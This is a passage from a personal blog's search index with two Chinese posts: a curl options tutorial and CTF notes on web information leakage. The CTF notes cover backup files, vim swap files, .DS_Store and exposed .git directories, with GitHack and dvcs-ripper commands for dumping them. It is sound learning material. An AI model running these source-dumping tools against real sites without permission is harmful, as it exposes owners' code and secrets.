            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl命令参数和用法</title>
      <link href="/2021/01/11/2021-1-11-curl-ming-ling-can-shu-he-yong-fa/"/>
      <url>/2021/01/11/2021-1-11-curl-ming-ling-can-shu-he-yong-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="curl命令参数和用法"><a href="#curl命令参数和用法" class="headerlink" title="curl命令参数和用法"></a>curl命令参数和用法</h1><p>curl即“客户端（client）的url工具”，是一种非常常用的命令行工具，用于请求服务端资源。</p><h2 id="不带参数-查看源代码"><a href="#不带参数-查看源代码" class="headerlink" title="不带参数(查看源代码)"></a>不带参数(查看源代码)</h2><p>不带有任何参数时，curl 就是发出 GET 请求。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><pre><code>　　&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;　　&lt;html&gt;&lt;head&gt;　　&lt;title&gt;301 Moved Permanently&lt;/title&gt;　　&lt;/head&gt;&lt;body&gt;　　&lt;h1&gt;Moved Permanently&lt;/h1&gt;　　&lt;p&gt;The document has moved &lt;a href="http://www.example.com.cn/"&gt;here&lt;/a&gt;.&lt;/p&gt;　　&lt;/body&gt;&lt;/html&gt;</code></pre><p>如果要把这个网页保存下来，可以使用<code>-o</code>参数，这就相当于使用<strong>wget</strong>命令了。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -o <span class="token punctuation">[</span>文件名<span class="token punctuation">]</span> www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="关于报头或响应信息"><a href="#关于报头或响应信息" class="headerlink" title="关于报头或响应信息"></a>关于报头或响应信息</h2><h2 id="A"><a href="#A" class="headerlink" title="-A"></a><strong>-A</strong></h2><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -A <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span> https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令将<code>User-Agent</code>改成 Chrome 浏览器。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -A <span class="token string">''</span> https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令会移除<code>User-Agent</code>标头。</p><h2 id="H"><a href="#H" class="headerlink" title="-H"></a><strong>-H</strong></h2><p><code>-H</code>参数添加 HTTP 请求的标头。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -H <span class="token string">'Accept-Language: en-US'</span> https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令添加 HTTP 标头<code>Accept-Language: en-US</code>。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -H <span class="token string">'Accept-Language: en-US'</span> -H <span class="token string">'Secret-Message: xyzzy'</span> https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令添加两个 HTTP 标头。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -d <span class="token string">'{"login": "emma", "pass": "123"}'</span> -H <span class="token string">'Content-Type: application/json'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令添加 HTTP 请求的标头是<code>Content-Type: application/json</code>，然后用<code>-d</code>参数发送 JSON 数据。</p><h2 id="d"><a href="#d" class="headerlink" title="-d"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -d<span class="token string">'login=emma＆password=123'</span>-X POST https://google.com/login<span class="token comment" spellcheck="true"># 或者</span>$ curl -d <span class="token string">'login=emma'</span> -d <span class="token string">'password=123'</span> -X POST  https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p><p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -d <span class="token string">'@data.txt'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p><h2 id="–data-urlencode"><a href="#–data-urlencode" class="headerlink" title="–data-urlencode"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl --data-urlencode <span class="token string">'comment=hello world'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p><h2 id="i"><a href="#i" class="headerlink" title="-i"></a>-i</h2><p><code>-i</code>参数可以显示http response的头信息，连同网页代码一起。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -i https://www.example.com                                                                                                                                                                                                  130 ↵HTTP/2 200 accept-ranges: bytesage: 551684cache-control: max-age<span class="token operator">=</span>604800content-type: text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8date: Mon, 11 Jan 2021 13:43:15 GMTetag: <span class="token string">"3147526947+ident"</span>expires: Mon, 18 Jan 2021 13:43:15 GMTlast-modified: Thu, 17 Oct 2019 07:18:26 GMTserver: ECS <span class="token punctuation">(</span>sjc/4E74<span class="token punctuation">)</span>vary: Accept-Encodingx-cache: HITcontent-length: 1256<span class="token operator">&lt;</span><span class="token operator">!</span>doctype html<span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>Example Domain<span class="token operator">&lt;</span>/title<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"utf-8"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">"Content-type"</span> content<span class="token operator">=</span><span class="token string">"text/html; charset=utf-8"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string">"viewport"</span> content<span class="token operator">=</span><span class="token string">"width=device-width, initial-scale=1"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>style type<span class="token operator">=</span><span class="token string">"text/css"</span><span class="token operator">></span>    body <span class="token punctuation">{</span>        background-color: <span class="token comment" spellcheck="true">#f0f0f2;</span>        margin: 0<span class="token punctuation">;</span>        padding: 0<span class="token punctuation">;</span>        font-family: -apple-system, system-ui, BlinkMacSystemFont, <span class="token string">"Segoe UI"</span>, <span class="token string">"Open Sans"</span>, <span class="token string">"Helvetica Neue"</span>, Helvetica, Arial, sans-serif<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    div <span class="token punctuation">{</span>        width: 600px<span class="token punctuation">;</span>        margin: 5em auto<span class="token punctuation">;</span>        padding: 2em<span class="token punctuation">;</span>        background-color: <span class="token comment" spellcheck="true">#fdfdff;</span>        border-radius: 0.5em<span class="token punctuation">;</span>        box-shadow: 2px 3px 7px 2px rgba<span class="token punctuation">(</span>0,0,0,0.02<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    a:link, a:visited <span class="token punctuation">{</span>        color: <span class="token comment" spellcheck="true">#38488f;</span>        text-decoration: none<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @media <span class="token punctuation">(</span>max-width: 700px<span class="token punctuation">)</span> <span class="token punctuation">{</span>        div <span class="token punctuation">{</span>            margin: 0 auto<span class="token punctuation">;</span>            width: auto<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token operator">&lt;</span>/style<span class="token operator">></span>    <span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>div<span class="token operator">></span>    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Example Domain<span class="token operator">&lt;</span>/h1<span class="token operator">></span>    <span class="token operator">&lt;</span>p<span class="token operator">></span>This domain is <span class="token keyword">for</span> use <span class="token keyword">in</span> illustrative examples <span class="token keyword">in</span> documents. You may use this    domain <span class="token keyword">in</span> literature without prior coordination or asking <span class="token keyword">for</span> permission.<span class="token operator">&lt;</span>/p<span class="token operator">></span>    <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"https://www.iana.org/domains/example"</span><span class="token operator">></span>More information<span class="token punctuation">..</span>.<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span><span class="token operator">&lt;</span>/div<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="I"><a href="#I" class="headerlink" title="-I"></a><strong>-I</strong></h2><p><code>-I</code>参数则是只显示http response的头信息。</p><h2 id="k"><a href="#k" class="headerlink" title="-k"></a><strong>-k</strong></h2><p><code>-k</code>参数指定跳过 SSL 检测。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -k https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令不会检查服务器的 SSL 证书是否正确。</p><h2 id="L"><a href="#L" class="headerlink" title="-L"></a><strong>-L</strong></h2><p><code>-L</code>参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -L -d <span class="token string">'tweet=hi'</span> https://api.twitter.com/tweet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="s"><a href="#s" class="headerlink" title="-s"></a><strong>-s</strong></h2><p><code>-s</code>参数将不输出错误和进度信息。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -s https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。</p><p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -s -o /dev/null https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="S"><a href="#S" class="headerlink" title="-S"></a><strong>-S</strong></h2><p><code>-S</code>参数指定只输出错误信息，通常与<code>-o</code>一起使用。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -s -o /dev/null https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令没有任何输出，除非发生错误。</p><h2 id="v"><a href="#v" class="headerlink" title="-v"></a><strong>-v</strong></h2><p><code>-v</code>参数输出通信的整个过程，用于调试。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -v https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><code>--trace</code>参数也可以用于调试，还会输出原始的二进制数据。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl --trace - https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="e"><a href="#e" class="headerlink" title="-e"></a><strong>-e</strong></h2><p><code>-e</code>参数用来设置 HTTP 的标头<code>Referer</code>，表示请求的来源。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">curl -e <span class="token string">'https://google.com?q=example'</span> https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令将<code>Referer</code>标头设为<code>https://google.com?q=example</code>。</p><p><code>-H</code>参数可以通过直接添加标头<code>Referer</code>，达到同样效果。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">curl -H <span class="token string">'Referer: https://google.com?q=example'</span> https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="x"><a href="#x" class="headerlink" title="-x"></a><strong>-x</strong></h2><p><code>-x</code>参数指定 HTTP 请求的代理。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令指定 HTTP 请求通过<code>myproxy.com:8080</code>的 socks5 代理发出。</p><p>如果没有指定代理协议，默认为 HTTP。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -x james:cats@myproxy.com:8080 https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令中，请求的代理使用 HTTP 协议。</p><h2 id="X"><a href="#X" class="headerlink" title="-X"></a><strong>-X</strong></h2><p><code>-X</code>参数指定 HTTP 请求的方法。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -X POST https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令对<code>https://www.example.com</code>发出 POST 请求。</p><h2 id="写入（上传）或保存（下载）文件或信息"><a href="#写入（上传）或保存（下载）文件或信息" class="headerlink" title="写入（上传）或保存（下载）文件或信息"></a>写入（上传）或保存（下载）文件或信息</h2><h2 id="o"><a href="#o" class="headerlink" title="-o"></a><strong>-o</strong></h2><p><code>-o</code>参数将服务器的回应保存成文件，等同于<code>wget</code>命令。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -o example.html https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令将<code>www.example.com</code>保存成<code>example.html</code>。</p><h2 id="O"><a href="#O" class="headerlink" title="-O"></a><strong>-O</strong></h2><p><code>-O</code>参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -O https://www.example.com/foo/bar.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令将服务器回应保存成文件，文件名为<code>bar.html</code>。</p><h2 id="b"><a href="#b" class="headerlink" title="-b"></a><strong>-b</strong></h2><p><code>-b</code>参数用来向服务器发送 Cookie。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -b <span class="token string">'foo=bar'</span> https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令会生成一个标头<code>Cookie: foo=bar</code>，向服务器发送一个名为<code>foo</code>、值为<code>bar</code>的 Cookie。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -b <span class="token string">'foo1=bar;foo2=bar2'</span> https://google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令发送两个 Cookie。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -b cookies.txt https://www.google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令读取本地文件<code>cookies.txt</code>，里面是服务器设置的 Cookie（参见<code>-c</code>参数），将其发送到服务器。</p><h2 id="c"><a href="#c" class="headerlink" title="-c"></a><strong>-c</strong></h2><p><code>-c</code>参数将服务器设置的 Cookie 写入一个文件。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -c cookies.txt https://www.google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件<code>cookies.txt</code>。</p><h2 id="d-1"><a href="#d-1" class="headerlink" title="-d"></a><strong>-d</strong></h2><p><code>-d</code>参数用于发送 POST 请求的数据体。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -d<span class="token string">'login=emma＆password=123'</span>-X POST https://google.com/login<span class="token comment" spellcheck="true"># 或者</span>$ curl -d <span class="token string">'login=emma'</span> -d <span class="token string">'password=123'</span> -X POST  https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p>使用<code>-d</code>参数以后，HTTP 请求会自动加上标头<code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略<code>-X POST</code>。</p><p><code>-d</code>参数可以读取本地文本文件的数据，向服务器发送。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -d <span class="token string">'@data.txt'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令读取<code>data.txt</code>文件的内容，作为数据体向服务器发送。</p><h2 id="–data-urlencode-1"><a href="#–data-urlencode-1" class="headerlink" title="–data-urlencode"></a><strong>–data-urlencode</strong></h2><p><code>--data-urlencode</code>参数等同于<code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl --data-urlencode <span class="token string">'comment=hello world'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面代码中，发送的数据<code>hello world</code>之间有一个空格，需要进行 URL 编码。</p><h2 id="F"><a href="#F" class="headerlink" title="-F"></a><strong>-F</strong></h2><p><code>-F</code>参数用来向服务器上传二进制文件。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -F <span class="token string">'file=@photo.png'</span> https://google.com/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令会给 HTTP 请求加上标头<code>Content-Type: multipart/form-data</code>，然后将文件<code>photo.png</code>作为<code>file</code>字段上传。</p><p><code>-F</code>参数可以指定 MIME 类型。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -F <span class="token string">'file=@photo.png;type=image/png'</span> https://google.com/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令指定 MIME 类型为<code>image/png</code>，否则 curl 会把 MIME 类型设为<code>application/octet-stream</code>。</p><p><code>-F</code>参数也可以指定文件名。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -F <span class="token string">'file=@photo.png;filename=me.png'</span> https://google.com/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令中，原始文件名为<code>photo.png</code>，但是服务器接收到的文件名为<code>me.png</code>。</p><h2 id="G"><a href="#G" class="headerlink" title="-G"></a><strong>-G</strong></h2><p><code>-G</code>参数用来构造 URL 的查询字符串。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -G -d <span class="token string">'q=kitties'</span> -d <span class="token string">'count=20'</span> https://google.com/search<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令会发出一个 GET 请求，实际请求的 URL 为<code>https://google.com/search?q=kitties&amp;count=20</code>。如果省略<code>--G</code>，会发出一个 POST 请求。</p><p>如果数据需要 URL 编码，可以结合<code>--data--urlencode</code>参数。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -G --data-urlencode <span class="token string">'comment=hello world'</span> https://www.example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="u"><a href="#u" class="headerlink" title="-u"></a><strong>-u</strong></h2><p><code>-u</code>参数用来设置服务器认证的用户名和密码。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -u <span class="token string">'bob:12345'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令设置用户名为<code>bob</code>，密码为<code>12345</code>，然后将其转为 HTTP 标头<code>Authorization: Basic Ym9iOjEyMzQ1</code>。</p><p>curl 能够识别 URL 里面的用户名和密码。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl https://bob:12345@google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。</p><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ curl -u <span class="token string">'bob'</span> https://google.com/login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>上面命令只设置了用户名，执行后，curl 会提示用户输入密码。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf中的信息泄露</title>
      <link href="/2021/01/11/2021-1-12-ctf-web-xin-xi-xie-lu/"/>
      <url>/2021/01/11/2021-1-12-ctf-web-xin-xi-xie-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="信息泄露总结"><a href="#信息泄露总结" class="headerlink" title="信息泄露总结"></a>信息泄露总结</h1><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>顾名思义，就是翻找目录。查找目录中的有用信息。一般来说要结合dirsearch或御剑等工具来进行查找。</p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>在可以“有限”地执行php命令地地方执行phpinfo()函数，可以得到服务器php配置的信息，比如：环境变量，可用模块，网站绝对路径，服务器操作系统，使用的组件等，为之后的操作提供思路和帮助。</p><h2 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h2><h3 id="网站源码泄露"><a href="#网站源码泄露" class="headerlink" title="网站源码泄露"></a>网站源码泄露</h3><p>当开发人员在线上环境中对源代码进行了备份操作，并且不小心将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><p>常见的的文件名：</p><p>www</p><p>wwwroot</p><p>back</p><p>backup</p><p>web</p><p>website</p><p>temp</p><p>常见的后缀：</p><p>zip</p><p>rar</p><p>tar</p><p>tar.gz</p><h3 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h3><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个或某部分文件的源代码。</p><p>即：文件名后面加后缀 .bak</p><h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>非正常关闭vim编辑器时会生成一个.swp文件</p><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p><p>以 index.php 为例：</p><p>第一次产生的交换文件名为 .index.php.swp</p><p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p><p>第三次产生的交换文件则为 .index.php.swn。</p><p>可以放到linux系统中使用vim工具加参数 -r修复此备份文件并打开</p><h3 id="DS-Store文件"><a href="#DS-Store文件" class="headerlink" title=".DS_Store文件"></a>.DS_Store文件</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。</p><p><strong>通过.DS_Store可以知道这个目录里面所有文件的清单。</strong></p><p>.DS_Store可以直接使用记事本打开，但是打开后乱码居多；也可以使用 Python-dsstore 这个工具 (<a href="https://github.com/gehaxelt/Python-dsstore" target="_blank" rel="noopener">https://github.com/gehaxelt/Python-dsstore</a>)  来完成 .DS_Store 文件的解析，直观一些。</p><h2 id="版本控制系统有关的泄露（Git、SVN、HG）"><a href="#版本控制系统有关的泄露（Git、SVN、HG）" class="headerlink" title="版本控制系统有关的泄露（Git、SVN、HG）"></a>版本控制系统有关的泄露（Git、SVN、HG）</h2><h3 id="版本控制系统"><a href="#版本控制系统" class="headerlink" title="版本控制系统"></a>版本控制系统</h3><p>集中式版本控制系统：Subversion(SVN)、CVS、VSS 等。<br>分布式版本控制系统：Git、Mercurial(Hg) 等。</p><p>对于各个版本控制系统的区别的分析介绍:<a href="https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html" target="_blank" rel="noopener">https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html</a></p><h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>1.漏洞利用：工具：GitHack （<a href="https://github.com/BugScanTeam/GitHack）" target="_blank" rel="noopener">https://github.com/BugScanTeam/GitHack）</a> 或 dvcs-ripper （<a href="https://github.com/kost/dvcs-ripper）" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper）</a></p><p><strong>GitHack</strong></p><p>使用方法：</p><pre><code>python2 GitHack.py URL/.git/</code></pre><p><strong>dvcs-ripper</strong></p><p>使用方法:</p><p>Example run (for git):</p><pre class="line-numbers language-bash"><code class="language-bash">rip-git.pl -v -u URL/.git/It will automatically <span class="token keyword">do</span> <span class="token function">git</span> checkout -f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>or if you would like to ignore SSL certification verification (with -s):</p><pre class="line-numbers language-bash"><code class="language-bash">rip-git.pl -s -v -u http://www.example.com/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/20200825145004389.jpg" alt="Git常用命令"></p><h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>log即指git中的日志，通过 <code>git log</code>命令来查看该项目的日志，然后用<code>git diff</code>命令来查看现版本和之前版本有什么不同，或者用<code>git reset</code>命令直接回到该版本。</p><h3 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h3><p>stash就相当于一个临时储存列表，当程序员想要调试该版本又不想丢掉之前某个版本的时候，就可以使用<code>git stash</code>命令将本地修改保存起来，并回到之前的版本。</p><pre class="line-numbers language-bash"><code class="language-bash">通过git stash存储的修改列表,可以通过git stash list查看.<span class="token function">git</span> stash show用于校验.<span class="token function">git</span> stash apply用于重新存储.直接执行git stash等同于git stash save.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最新的存储保存在refs/stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p><p>步骤：</p><p>1.用<code>git stash list</code>命令查看储存列表</p><p>2.用<code>git stash show</code>查看该版本有什么不同</p><p>3.用<code>git stash pop stash@{n}</code>来释放这个版本，n为要释放的版本的索引。</p><h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p>index是Git本地库中的索引，是一个二进制文件。索引中包含一个列表，列表根据文件名、文件模式和文件元数据进行了排序，以便快速检测文件的变化。</p><p>索引中还包含所有Blob类型的SHA-1标识符。</p><blockquote><p><strong>Git文件状态</strong></p><p>对于新创建的一个文件，其状态为untracked。</p><p>通过git add …命令，可以将该新建文件的状态转换为staged，这个过程就是将新建文件加入到Index中。</p><p>通过git commit命令，可以将处于staged状态的文件提交到本地库的HEAD。</p></blockquote><p><strong>关键</strong></p><p><code>git checkout-index</code>命令</p><p><strong>将Index中列表的文件检出到工作目录，默认不覆盖已有文件</strong>。</p><ul><li>-u, –index，更新所有检出的文件的stat信息（git status）</li><li>-a, –all，检出Index中列表的所有文件</li><li>-f, –force，检出时覆盖已有文件</li><li>-n, –no-create，只再次检出工作目录中已有的文件（不创建任何新文件）</li><li>–，禁用任何参数</li></ul><p>例如：</p><ul><li>从Index检出已有文件的最新版本，并覆盖</li></ul><pre><code>git checkout-index -n -f</code></pre><ul><li>检出全部文件到git-export-dir目录</li></ul><pre><code>git checkout-index -a --prefix=git-export-dir/</code></pre><ul><li>检出文件Makefile，并重命名为.merged-Makefile</li></ul><pre><code>git checkout-index --prefix=.merged- Makefile</code></pre><p><strong>可能有用</strong></p><ol><li><code>git update-index</code>命令<br> 将工作目录中的文件加入到index列表中。<br> 不建议使用该命令，同样情况下推荐使用git add</li></ol><p>如下命令完全等价：</p><ul><li>为myFile文件设置可执行权限</li></ul><pre><code>git add --chmod=+x myFilegit update-index --chmod=+x 